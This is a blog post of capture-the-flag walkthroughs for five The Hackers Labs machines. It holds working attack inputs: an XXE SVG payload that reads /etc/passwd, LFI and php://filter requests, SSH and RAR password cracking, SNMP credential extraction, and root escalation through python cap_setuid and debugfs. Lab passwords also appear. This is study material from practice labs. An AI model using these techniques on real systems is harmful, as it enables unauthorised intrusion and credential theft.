---
layout: post
title: the hackers labs notes
date: 2025-10-12 14:16 +0800
categories: 
  - permeation
tags: 
  - the hackers labs
image: /assets/img/backgrounds/thehackerslabs.png
---


> From now , I'm diving into stuff that actually fires me up - no more "shoulds," just pure curiosity.

## Tortuga

> **提示:** 靶机跳转传送门
[Tortuga](https://labs.thehackerslabs.com/machines/131)

<img src="/assets/img/thehackerslabs-notes/20251012150814_008.webp" alt="Tortugs" style="zoom:50%;" />

### 信息搜集

![img](/assets/img/thehackerslabs-notes/20251012150813_000.webp)

扫端口，发现22和80，简单访问下80端口

下面两个php文件，dirsearch爆破过其他路径，也失败了，接下来就看看能不能走参数

翻译了下这个`mapa.php`路由，感觉上是让我找文件，然后就爆破参数名的时候，不能把目标文件写我们测试的`mapa.php`，目前来看，`index.html`，`tripulacion.php`文件都可以

![img](/assets/img/thehackerslabs-notes/20251012150813_001.webp)

用burp爆破攻击就好了，发现参数名就是filename

![img](/assets/img/thehackerslabs-notes/20251012150813_002.webp)

look here,这是`http://10.161.253.201/mapa.php?filename=tripulacion.php`的结果，两个文件都显示出来了
> **警告:** 不能执行filename=mapa.php的原因是这会导致php无限递归包含，最后达到memory_limit后触发HTTP 500 Internal Server Error给我们，对我来说这个解释应该是没问题了


![img](/assets/img/thehackerslabs-notes/20251012150813_003.webp)

然后我们尝试/etc/passwd,可惜失败了，但是发现双写后就没有问题，可以进行路径穿越

![img](/assets/img/thehackerslabs-notes/20251012150813_004.webp)

但是只能本地进行路径穿越，我也拿不到shell，回到那个mapa.php，会发现他们加粗了用户名grumete，正好这个也是/etc/passwd上面出现的用户，接下来需要考虑ssh弱密码爆破了

![img](/assets/img/thehackerslabs-notes/20251012150813_005.webp)

成功爆破出来，拿到了userflag

读取那个.nota.txt，拿到了capitan的登录密码`mar_de_fuego123`（实质上这一步可以不用

暂时回到web服务，我看看，确认了，我前面的操作都没问题

![img](/assets/img/thehackerslabs-notes/20251012150813_006.webp)

### 提权

然后想办法提权root

通过linepeas，掌握了新的技能

![img](/assets/img/thehackerslabs-notes/20251012150814_007.webp)

```bash
capitan@TheHackersLabs-Tortuga:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.11 cap_setuid=ep
capitan@TheHackersLabs-Tortuga:~$ 
```

这里的`cap_setuid`能力集相较平时提权用的`suid`更厉害， 就是说它能分配`setuid(),setgid(),setresuid()`等特殊权限功能

```bash
capitan@TheHackersLabs-Tortuga:~$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Tortuga:~# cat /root/root.txt
c???????????????????????????ae
```

## ZAPP
> **提示:** 靶机跳转传送门
[ZAPP](https://labs.thehackerslabs.com/machines/143)

<img src="/assets/img/thehackerslabs-notes/zapp.png" alt="ZAPP" style="zoom:50%;" />

### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.167.222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-02 22:11 CST
Nmap scan report for 10.161.167.222
Host is up (0.81s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
```

先分析下ftp协议

```bash
(base) yolo@yolo:~$ ftp 10.161.167.222
Connected to 10.161.167.222.
220 Welcome zappskred.
Name (10.161.167.222:yolo): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
Commands may be abbreviated.  Commands are:

!               delete          hash            mlsd            pdir            remopts         struct
$               dir             help            mlst            pls             rename          sunique
account         disconnect      idle            mode            pmlsd           reset           system
append          edit            image           modtime         preserve        restart         tenex
ascii           epsv            lcd             more            progress        rhelp           throttle
bell            epsv4           less            mput            prompt          rmdir           trace
binary          epsv6           lpage           mreget          proxy           rstatus         type
bye             exit            lpwd            msend           put             runique         umask
case            features        ls              newer           pwd             send            unset
cd              fget            macdef          nlist           quit            sendport        usage
cdup            form            mdelete         nmap            quote           set             user
chmod           ftp             mdir            ntrans          rate            site            verbose
close           gate            mget            open            rcvbuf          size            xferbuf
cr              get             mkdir           page            recv            sndbuf          ?
debug           glob            mls             passive         reget           status
ftp> ls
229 Entering Extended Passive Mode (|||58817|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              28 Oct 29 20:59 login.txt
-rw-r--r--    1 0        0              65 Oct 29 21:23 secret.txt
226 Directory send OK.
ftp> get login.txt
local: login.txt remote: login.txt
229 Entering Extended Passive Mode (|||6845|)
150 Opening BINARY mode data connection for login.txt (28 bytes).
100% |*******************************************************************|    28        5.08 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (3.04 KiB/s)
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||51043|)
150 Opening BINARY mode data connection for secret.txt (65 bytes).
100% |*******************************************************************|    65        9.05 KiB/s    00:00 ETA
226 Transfer complete.
65 bytes received in 00:00 (6.08 KiB/s)
ftp> bye
221 Goodbye.
(base) yolo@yolo:~$ ls
8c5852e6-56fe-4474-9fc7-70123454c347.gif  key      login.txt   nfspy_mount  pattern.txt  secret.txt  test1
Desktop                                   key.pub  miniforge3  ntfs.db      reports      snap        test2
(base) yolo@yolo:~$ cat login.txt
puerto
4444
coffee
GoodLuck
(base) yolo@yolo:~$ cat secret.txt
0jO cOn 31 c4fe 813n p23p424dO, 4 v3c35 14 pista 357a 3n 14 7424
```

匿名用户拿到两个文件，发现secret.txt是leet语言，解密说是小心烫的咖啡，没搞懂，接下来看看http呢？

审计源码，拿到了

```html
<div style="display:none">4444 VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=</div>
```

进行4次base64解码，拿到了串字符，不晓得是什么，多次尝试，发现是一个路由

<img src="/assets/img/thehackerslabs-notes/image-20251102223447740.png" alt="image-20251102223447740" style="zoom:50%;" />

拿到了一个压缩包

<img src="/assets/img/thehackerslabs-notes/image-20251102223522660.png" alt="image-20251102223522660" style="zoom:50%;" />

怎么能是压缩的呢，不晓得密码是啥

### get flag

> 下面是参考老大的视频学习的：【thehackerlabs ZAPP靶机复盘-哔哩哔哩】 https://b23.tv/MdQIjKw

这里需要用rockyou进行爆破

```bash
~$ wget http://10.161.167.222/cuatrocuatroveces/Sup3rP4ss.rar
~$ rar2john Sup3rP4ss.rar > tmp
~$ john tmp --wordlist=/snap/seclists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 32 OpenMP threads
Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
reema            (Sup3rP4ss.rar)
1g 0:00:00:19 DONE (2025-11-02 23:22) 0.05056g/s 4296p/s 4296c/s 4296C/s tracymcgrady..llandudno
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

拿到了压缩包密码

```bash
(base) yolo@yolo:~/Desktop/timu$ unrar x Sup3rP4ss.rar

UNRAR 7.00 freeware      Copyright (c) 1993-2024 Alexander Roshal


Extracting from Sup3rP4ss.rar

Enter password (will not be echoed) for Sup3rP4ss.txt:

Extracting  Sup3rP4ss.txt                                             OK
All OK
(base) yolo@yolo:~/Desktop/timu$ cat Sup3rP4ss.txt
Intenta probar con más >> 3spuM4 
```

哈哈，这里真难绷，都能硬控老大10多分钟，3spuM4是一个用户的密码，但是我们不晓得用户名，老大已经帮我测试了好多好多，最后发现是这里的`zappskred`

![image-20251102232650887](/assets/img/thehackerslabs-notes/image-20251102232650887.png)

这里的用户名我们前面见过一次的，是主机名

<img src="/assets/img/thehackerslabs-notes/image-20251102232807152.png" alt="image-20251102232807152" style="zoom:50%;" />

直接ssh远程登上去，拿到user.txt，接下来查看.bash_history，其实已经能知道rootflag是啥了，也能看得出来，这里出题人打算用sudoers出，直接拿root

```bash
zappskred@TheHackersLabs-ZAPP:~$ ls
user.txt
zappskred@TheHackersLabs-ZAPP:~$ cat user.txt
ZWwgbWVqb3?????????=
zappskred@TheHackersLabs-ZAPP:~$ cat .bash_history
ftp
sudo apt install ftp
sudo apt install vsftpd -y
sudo su
su
clear
sudo apt install vsftpd -y
ftpdç
ftpd
cd /etc/
ls
ip a
cls
clear
ip a
sudo dhclient
clear
ip a
sudo reboot now
cat /etc/sudoers
sudo cat /etc/sudoers
sudo su
sudo root
exit
clear
ifconfig
ip a
ssh-keygen -f '/home/kali/.ssh' -R '192.168.1.34'
ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
sudo ssh-keygen -f '/home/kali/ .ssh' -R '192.168.1.34'
exit
clear
ls
clear
exit
clear
passwd
exit
clear
ls
cat
clear
sudo apt install zsh
exit
clear
whoami
sudo -l
clear
sudo zsh
sudo su
sudo root
exit
ls
sudo -l
sudo zsh
clear
echo "exitosocafe" | base64
exit
ls
ls -lash
cp user.txt user.txt
mv user.txt user.txt
rm user.txt
ls
clear
echo "el mejor cafe" | base64 > user.txt
ls
cd ..
system
apt install apache2
exit
clear
sudo zsh
clear
nano ~/.bashrc
cat /etc/issue
exit
sudo zsh
clear
sudo zsh
clear
sudo zsh
exit
echo '    ███████╗ █████╗ ██████╗ ██████╗
 ╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
   ███╔╝ ███████║██████╔╝██████╔╝
  ███╔╝  ██╔══██║██╔═══╝ ██╔═══╝
 ███████╗██║  ██║██║     ██║
 ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝

' | sudo tee /etc/issue.net > /dev/null
clear
sudo zsh
exit
sudo zsh
exit
zappskred@TheHackersLabs-ZAPP:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
[sudo] password for zappskred:
Sorry, try again.
[sudo] password for zappskred:
Matching Defaults entries for zappskred on TheHackersLabs-ZAPP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zappskred may run the following commands on TheHackersLabs-ZAPP:
    (root) /bin/zsh
zappskred@TheHackersLabs-ZAPP:~$ sudo /bin/zsh
sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
TheHackersLabs-ZAPP# cat ~/root.txt
c2llbXByZSBlcyBudWV???????==
TheHackersLabs-ZAPP#
```

## Photographer

> **提示:** 靶机跳转传送门
[Photographer](https://labs.thehackerslabs.com/machines/142)

<img src="/assets/img/thehackerslabs-notes/photographer.png" alt="Photographer" style="zoom:50%;" />

### 信息搜集

IP 10.161.208.161

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.208.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:03 CST
Nmap scan report for 10.161.208.161
Host is up (0.0053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
```

就两个端口，直接看web

dirsearch扫描过，发现了admin登录界面，但是账号密码都不清楚，尝试过sql注入，也失效，不喜欢爆破密码，再说同时爆破两处几乎不怎么会成功，接下来去研究有没有其他端口开放，比如说udp和tcp端口

```bash
(base) yolo@yolo:~$ sudo nmap -sU -p 53,67,68,69,123,135,137,138,139,161,162,445,514,631,1434 10.161.208.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:42 CST
Nmap scan report for 10.161.208.161
Host is up (0.0026s latency).

PORT     STATE         SERVICE
53/udp   closed        domain
67/udp   closed        dhcps
68/udp   open|filtered dhcpc
69/udp   closed        tftp
123/udp  closed        ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  closed        netbios-dgm
139/udp  closed        netbios-ssn
161/udp  open          snmp
162/udp  closed        snmptrap
445/udp  closed        microsoft-ds
514/udp  closed        syslog
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
```

发现这里的snmp端口开放，相关介绍可以拜读下面的宝藏笔记

宝藏网站笔记https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html

```bash
(base) yolo@yolo:~$ snmpwalk -v 2c -c public 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull = No more variables left in this MIB View (It is past the end of the MIB tree)
(base) yolo@yolo:~$ snmpwalk -v 2c -c security 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."mycreds" = STRING: ethan:1N3qVgwNB6cZmNSyr8iX$!
```

会发现这里，SNMP的只读社区字符串读取不到信息，只能在特权社区中去读取，应该是拿到了网站的账密，理由是ethan刚好在主页见过

<img src="/assets/img/thehackerslabs-notes/image-20251105215034702.png" alt="image-20251105215034702" style="zoom:50%;" />

### get shell

成功登录进来了

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css?v=1">
    <title>Admin</title>
</head>
<body>
	<div class="log-form">
		<h2>Subir Fotografía</h2>
	  	<form method="POST" action="upload.php" enctype="multipart/form-data">
			<input type="file" name="file" accept=".jpg,.png,.gif,.jpeg">
	    		<button type="submit" class="btn">Subir</button>
	  	</form>
	</div>

	<a href="/admin/logout.php" style="background: #b00020; color: #fff; text-decoration: none; padding: .5rem; margin-top: 1rem; display: inline-block;" >Cerrar sesión</a>
	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
</body>
</html>

```

发现是个文件上传，而且呢，~~这里只有前端限制，完全可以抓包再发~~

图片上传失败了，因为我发现上传的图片会自动打开，然后观察到这里用img标签解析，那么也许可以尝试下svg

<img src="/assets/img/thehackerslabs-notes/image-20251105221154546.png" alt="image-20251105221154546" style="zoom:50%;" />

look here

<img src="/assets/img/thehackerslabs-notes/image-20251105221030326.png" alt="image-20251105221030326" style="zoom:50%;" />

然后我研究了下，尝试的payload如下，可以读任意文件

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="20">&xxe;</text>
</svg>

```

先拿下upload.php，很疑惑，为啥能传svg文件

<img src="/assets/img/thehackerslabs-notes/image-20251105222247800.png" alt="image-20251105222247800" style="zoom:50%;" />

```php
<?php

function displayHTMLImage($imageFile)
{
    $type = mime_content_type($imageFile);

    switch ($type) {
        case 'image/jpg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/jpeg':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpeg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/png':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/png;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/gif':
            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/gif;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
            break;
        case 'image/svg+xml'://关注这里，启用外部实体加载，会直接输出svg内容
            libxml_disable_entity_loader(false);
	    $doc = new DOMDocument();
            $doc->loadXML(file_get_contents($imageFile), LIBXML_NOENT | LIBXML_DTDLOAD);
	    $svg = $doc->getElementsByTagName('svg');
            echo $svg->item(0)->C14N();
            break;
        default:
            echo "Tipo de imagen no reconocida.";
    }
}

$target_dir = "./ethan_photographs/";

$fileName = date('ymd') . '_' . basename($_FILES["file"]["name"]);
$target_file = $target_dir . $fileName;


$contentType = $_FILES['file']['type'];
$MIMEtype = mime_content_type($_FILES['file']['tmp_name']);


if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "ExtensiÃ³n no permitida.";
    die();
}

if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Solo se permiten imagenes.";
    die();
}
//look here，发现后缀名仅仅看最后一个字母，恰好svg也是g结尾
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Solo se permiten imagenes.";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "Archivo demasiado grande.";
    die();
}

if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "Ocurrio un error al subir el archivo.";
}
```

接下来关注下db.php，看有没有信息泄露

```php
<?php
$host = "localhost";
$db = "blog";
$user = "root";
$pass = "pjtF0533OPiSMQTGZacZY6jy$";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

```

拿到一个密码，应该就是服务器内部某个用户密码吧，看过/etc/passwd了，存在一个ethan

```bash
(base) yolo@yolo:~$ ssh ethan@10.161.208.161
The authenticity of host '10.161.208.161 (10.161.208.161)' can't be established.
ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.161.208.161' (ED25519) to the list of known hosts.
ethan@10.161.208.161's password:
Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer

Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
ethan@photographer:~$ ls
creds.txt  user.txt
```

这里的提权是通过disk用户组

```bash
ethan@photographer:~$ id
uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
```

网上找了个[教程](https://blog.csdn.net/2301_79518550/article/details/145452956)，使用/usr/sbin/debugfs成功读取root.txt

```bash
ethan@photographer:~$ ls -la /dev/sd*
brw-rw---- 1 root disk 8, 0 nov  5 14:00 /dev/sda
brw-rw---- 1 root disk 8, 1 nov  5 14:00 /dev/sda1
brw-rw---- 1 root disk 8, 2 nov  5 14:00 /dev/sda2
brw-rw---- 1 root disk 8, 5 nov  5 14:00 /dev/sda5
ethan@photographer:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  ls
debugfs:  cd /root
debugfs:  ls
debugfs:  cat root.txt
dc54639c5bd88637cc23dd7???????bf
debugfs:
```

## THLPWN
> **提示:** 靶机跳转传送门
[THLPWN](https://labs.thehackerslabs.com/machines/141)

<img src="/assets/img/thehackerslabs-notes/thlpwn.png" alt="THLPWN" style="zoom:50%;" />


### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.144.56
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 12:20 CST
Nmap scan report for 10.161.144.56
Host is up (0.86s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

扫描完常见端口，发现就两个开放，访问网页，发现需要指定hostname,然后这里注释了一个信息，应该就是了

```bash
curl -H "Host: thlpwn.thl" http://10.161.144.56
```

<img src="/assets/img/thehackerslabs-notes/image-20251109122631937.png" alt="image-20251109122631937" style="zoom:50%;" />

浏览器中的话，那就用hackbar插件弄

<img src="/assets/img/thehackerslabs-notes/image-20251109122857258.png" alt="image-20251109122857258" style="zoom:50%;" />

嘶，总感觉这题我好像有点非预期

### solve

在download下面下载了个二进制文件，逆向分析下，直接拿到用户账密

<img src="/assets/img/thehackerslabs-notes/image-20251109124045480.png" alt="image-20251109124045480" style="zoom:50%;" />

然后呢就进去拿到flag，至于root的话，这里直接是无密码sudo权限

<img src="/assets/img/thehackerslabs-notes/image-20251109124234097.png" alt="image-20251109124234097" style="zoom:50%;" />

## LavaShop
> **提示:** 靶机跳转传送门
[LavaShop](https://labs.thehackerslabs.com/machines/140)

<img src="/assets/img/thehackerslabs-notes/LavaShop.png" alt="LavaShop" style="zoom:50%;" />

### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.145.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 13:17 CST
Nmap scan report for 10.161.145.95
Host is up (0.73s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
```

扫描常见端口，看上去只有80端口能用

看上去需要先手动改hosts

```bash
(base) yolo@yolo:~$ curl http://10.161.145.95
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://lavashop.thl/">here</a>.</p>
<hr>
<address>Apache/2.4.62 (Debian) Server at 10.161.145.95 Port 80</address>
</body></html>
(base) yolo@yolo:~$ sudo nano /etc/hosts
(base) yolo@yolo:~$ curl http://10.161.145.95
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://lavashop.thl/">here</a>.</p>
<hr>
<address>Apache/2.4.62 (Debian) Server at 10.161.145.95 Port 80</address>
</body></html>
(base) yolo@yolo:~$ curl http://lavashop.thl
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>LavaShop</title>
  <link rel="stylesheet" href="/assets/css/styles.css?v=1">
</head>
<body>

<header class="site-header">
  <div class="site-header__inner">
    <!-- Logo -->
    <a href="/index.php" class="site-logo">
      <span class="site-logo__icon"></span>
      <span class="site-logo__text">LavaShop</span>
    </a>

    <!-- Menú -->
    <nav class="site-nav" aria-label="Principal">
  <ul class="site-nav__list">
    <li><a class="site-nav__link" href="/index.php?page=home">Inicio</a></li>
    <li><a class="site-nav__link" href="/index.php?page=products">Productos</a></li>
    <li><a class="site-nav__link" href="/index.php?page=about">Sobre Nosotros</a></li>
    <li><a class="site-nav__link" href="/index.php?page=contact">Contacto</a></li>
  </ul>
</nav>
  </div>
</header>

    <section class="hero" style="padding: 3rem 0; text-align:center;">
      <h2>Bienvenido a LavaLamps Shop</h2>
      <p>Las mejores lámparas de lava para diseñar tu espacio.</p>
      <p style="margin-top:1rem;">
        <a class="cta" href="/index.php?page=products" style="display:inline-block;background:#ff445a;color:#fff;padding:.75rem 1.1rem;border-radius:10px;text-decoration:none;font-weight:700;">
          Ver catálogo
        </a>
      </p>
    </section>
    <footer>
  <p>&copy; 2025 Lava Lamps Shop - Todos los derechos reservados.</p>
</footer>
</body>
</html>
</body></html>
```

然后扫描两次路径，找到一些php，可以考虑爆破参数名了

```bash
(base) yolo@yolo:~$ dirsearch -u http://lavashop.thl/
/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/yolo/reports/http_lavashop.thl/__25-11-09_13-24-41.txt

Target: http://lavashop.thl/

[13:24:41] Starting:
[13:24:42] 403 -  277B  - /.ht_wsr.txt
[13:24:42] 403 -  277B  - /.htaccess.bak1
[13:24:42] 403 -  277B  - /.htaccess.orig
[13:24:42] 403 -  277B  - /.htaccess.sample
[13:24:42] 403 -  277B  - /.htaccess.save
[13:24:42] 403 -  277B  - /.htaccess_extra
[13:24:42] 403 -  277B  - /.htaccess_orig
[13:24:42] 403 -  277B  - /.htaccess_sc
[13:24:42] 403 -  277B  - /.htaccessOLD
[13:24:42] 403 -  277B  - /.htaccessBAK
[13:24:42] 403 -  277B  - /.htaccessOLD2
[13:24:42] 403 -  277B  - /.htm
[13:24:42] 403 -  277B  - /.html
[13:24:42] 403 -  277B  - /.htpasswd_test
[13:24:42] 403 -  277B  - /.htpasswds
[13:24:42] 403 -  277B  - /.httr-oauth
[13:24:42] 403 -  277B  - /.php
[13:24:49] 403 -  277B  - /assets/
[13:24:49] 301 -  313B  - /assets  ->  http://lavashop.thl/assets/
[13:24:54] 301 -  315B  - /includes  ->  http://lavashop.thl/includes/
[13:24:54] 403 -  277B  - /includes/
[13:24:57] 301 -  312B  - /pages  ->  http://lavashop.thl/pages/
[13:24:57] 403 -  277B  - /pages/
[13:25:00] 403 -  277B  - /server-status/
[13:25:00] 403 -  277B  - /server-status

Task Completed
(base) yolo@yolo:~$ dirsearch -u http://lavashop.thl/pages/
/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/yolo/reports/http_lavashop.thl/_pages__25-11-09_13-35-15.txt

Target: http://lavashop.thl/

[13:35:15] Starting: pages/
[13:35:17] 200 -  179B  - /pages/about.php
[13:35:22] 200 -  119B  - /pages/contact.php
[13:35:25] 200 -  169B  - /pages/home.php
[13:35:30] 200 -  352B  - /pages/products.php

Task Completed
```

看上去products.php内容多一些，那么的话，看看能爆破出来任意读取文件的参数吗，盲猜一波，是file

```bash
(base) yolo@yolo:~$ wfuzz -w /snap/seclists/1214/Discovery/Web-Content/common.txt -u http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd --hh 1002
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd
Total requests: 4750

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001798:   200        54 L     145 W      2466 Ch     "file"

Total time: 3.059159
Processed Requests: 4750
Filtered Requests: 4749
Requests/sec.: 1552.714
```

猜对咯

然后我们读取一下products.php的内容

```bash
curl "http://lavashop.thl/pages/products.php?file=php://filter/convert.base64-encode/resource=products.php"
```

很明显的文件包含

<img src="/assets/img/thehackerslabs-notes/image-20251109143519816.png" alt="image-20251109143519816" style="zoom:50%;" />
